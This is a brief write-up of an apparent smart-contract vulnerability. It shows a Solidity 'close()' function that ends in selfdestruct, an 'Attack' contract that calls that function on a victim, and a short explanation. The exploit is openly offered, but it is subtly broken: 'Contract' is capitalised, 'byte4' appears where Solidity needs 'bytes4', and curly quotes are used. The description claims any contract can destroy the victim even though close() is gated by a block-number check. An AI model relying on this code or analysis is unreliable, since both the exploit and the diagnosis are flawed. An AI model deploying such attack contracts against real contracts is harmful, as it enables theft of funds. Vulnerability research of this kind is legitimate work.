## Vulnerable Code

```javascript
function close() public {
    require(block.number > endBlock);

    ButtonFactory f = ButtonFactory(factory);

    if (!owner.send(3*rake/4)){
      // Owner can't accept their portion of the rake, so send it to the factory.
      f.announceWinner.value(rake)(lastPresser, address(this).balance);
    } else {
      f.announceWinner.value(rake/4)(lastPresser, address(this).balance);
    }

    emit Winner(lastPresser, address(this).balance);
    selfdestruct(lastPresser);  //Vulnerable position
  }
```



## Exploit Code

```javascript
Contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“close()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Let's look at the commant of '//Vulnerable position',the statement is not protected by any way.so if an malicious contract call the method -'close'.In this situation, the victim contract can be destruct by any macious contract easily. 
